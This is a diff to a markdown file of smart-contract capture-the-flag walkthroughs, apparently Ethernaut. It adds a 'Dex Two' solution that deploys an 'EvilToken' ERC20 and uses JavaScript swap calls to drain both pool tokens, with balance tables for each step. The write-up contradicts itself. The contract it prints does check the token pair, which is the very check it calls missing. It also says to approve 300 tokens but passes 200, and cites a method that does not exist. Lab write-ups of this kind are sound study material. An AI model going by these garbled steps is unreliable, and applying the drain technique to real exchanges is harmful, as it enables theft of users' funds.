@@ -1490,36 +1490,39 @@ pragma solidity ^0.6.0;
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import '@openzeppelin/contracts/math/SafeMath.sol';
+import '@openzeppelin/contracts/access/Ownable.sol';
 
-contract Dex  {
+contract Dex is Ownable {
   using SafeMath for uint;
   address public token1;
   address public token2;
-  constructor(address _token1, address _token2) public {
+  constructor() public {}
+
+  function setTokens(address _token1, address _token2) public onlyOwner {
     token1 = _token1;
     token2 = _token2;
+  }
+
+  function addLiquidity(address token_address, uint amount) public onlyOwner {
+    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
   }
 
   function swap(address from, address to, uint amount) public {
     require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
     require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
-    uint swap_amount = get_swap_price(from, to, amount);
+    uint swapAmount = getSwapPrice(from, to, amount);
     IERC20(from).transferFrom(msg.sender, address(this), amount);
-    IERC20(to).approve(address(this), swap_amount);
-    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
+    IERC20(to).approve(address(this), swapAmount);
+    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
   }
 
-  function add_liquidity(address token_address, uint amount) public{
-    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
-  }
-
-  function get_swap_price(address from, address to, uint amount) public view returns(uint){
+  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
     return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
   }
 
   function approve(address spender, uint amount) public {
-    SwappableToken(token1).approve(spender, amount);
-    SwappableToken(token2).approve(spender, amount);
+    SwappableToken(token1).approve(msg.sender, spender, amount);
+    SwappableToken(token2).approve(msg.sender, spender, amount);
   }
 
   function balanceOf(address token, address account) public view returns (uint){
@@ -1528,8 +1531,15 @@ contract Dex  {
 }
 
 contract SwappableToken is ERC20 {
-  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
+  address private _dex;
+  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
         _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+  }
+
+  function approve(address owner, address spender, uint256 amount) public returns(bool){
+    require(owner != _dex, "InvalidApprover");
+    super._approve(owner, spender, amount);
   }
 }
 ```
@@ -1622,6 +1632,139 @@ The exchange itself is decentralized, but the price of the asset is centralized,
 [Uniswap TWAP Oracles](https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles) relies on a time weighted price model called [TWAP](https://en.wikipedia.org/wiki/Time-weighted_average_price#). While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.
 
 ### Level 23. Dex Two
+
+**Goal**: `player` has to drain all of `token1` and `token2`.
+
+Given Contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import '@openzeppelin/contracts/math/SafeMath.sol';
+import '@openzeppelin/contracts/access/Ownable.sol';
+
+contract Dex is Ownable {
+  using SafeMath for uint;
+  address public token1;
+  address public token2;
+  constructor() public {}
+
+  function setTokens(address _token1, address _token2) public onlyOwner {
+    token1 = _token1;
+    token2 = _token2;
+  }
+
+  function addLiquidity(address token_address, uint amount) public onlyOwner {
+    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+  }
+
+  function swap(address from, address to, uint amount) public {
+    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+    uint swapAmount = getSwapPrice(from, to, amount);
+    IERC20(from).transferFrom(msg.sender, address(this), amount);
+    IERC20(to).approve(address(this), swapAmount);
+    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+  }
+
+  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
+    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+  }
+
+  function approve(address spender, uint amount) public {
+    SwappableToken(token1).approve(msg.sender, spender, amount);
+    SwappableToken(token2).approve(msg.sender, spender, amount);
+  }
+
+  function balanceOf(address token, address account) public view returns (uint){
+    return IERC20(token).balanceOf(account);
+  }
+}
+
+contract SwappableToken is ERC20 {
+  address private _dex;
+  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+  }
+
+  function approve(address owner, address spender, uint256 amount) public returns(bool){
+    require(owner != _dex, "InvalidApprover");
+    super._approve(owner, spender, amount);
+  }
+}
+```
+
+The vulnerability here arises from `swap` method which does not check that the swap is necessarily between `token1` and `token2`. We'll exploit this.
+
+Let's deploy a token - `EvilToken` in Remix, with initial supply of 400, all given to `msg.sender` which would be the `player`:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract EvilToken is ERC20 {
+    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
+        _mint(msg.sender, initialSupply);
+    }
+}
+```
+
+We're going to exchange `EVL` token for `token1` and `token2` in such a way to drain both from `DexTwo`. Initially both `token1` and `token2` is 100. Let's send 100 of `EVL` to `DexTwo` using `EvilToken`'s `transfer`. So, that price ratio in `DexTwo` between `EVL` and `token1` is 1:1. Same ratio goes for `token2`.
+
+Also, allow `DexTwo` to transact 300 (100 for `token1` and 200 for `token2` exchange) of our `EVL` tokens so that it can swap `EVL` tokens. This can be done by `approve` method of `EvilToken`, passing `contract.address` and `200` as params.
+
+Alright at this point `DexTwo` has 100 of each - `token1`, `token2` and `EVL`. And `player` has 300 of `EVL`.
+
+|  DEX   |        |     | player |        |     |
+| :----: | :----: | --- | :----: | :----: | --- |
+| token1 | token2 | EVL | token1 | token2 | EVL |
+|  100   |  100   | 100 |   10   |   10   | 300 |
+
+Get token addresses:
+
+```js
+evlToken = "<EVL-token-address>";
+t1 = await contract.token1();
+t2 = await contract.token2();
+```
+
+Swap 100 of `player`'s `EVL` with `token1`:
+
+```js
+await contract.swap(evlToken, t1, 100);
+```
+
+Updated balances:
+
+|  DEX   |        |     | player |        |     |
+| :----: | :----: | --- | :----: | :----: | --- |
+| token1 | token2 | EVL | token1 | token2 | EVL |
+|  100   |  100   | 100 |   10   |   10   | 300 |
+|   0    |  100   | 200 |  110   |   10   | 200 |
+
+Now, according to `get_swap_amount` method, to get all 100 of `token2` in exchange we need 200 of `EVL`. Swap accordingly:
+
+```js
+await contract.swap(evlToken, t2, 200);
+```
+
+Finally:
+
+|  DEX   |        |     | player |        |     |
+| :----: | :----: | :-: | :----: | :----: | :-: |
+| token1 | token2 | EVL | token1 | token2 | EVL |
+|  100   |  100   | 100 |   10   |   10   | 300 |
+|   0    |  100   | 200 |  110   |   10   | 200 |
+|   0    |   0    | 400 |  110   |  110   |  0  |
+
+Useful links:
+[Using Remix to Deploy to Moonbeam](https://docs.moonbeam.network/builders/build/eth-api/dev-env/remix/)
 
 ### Level 24. Puzzle Wallet
 
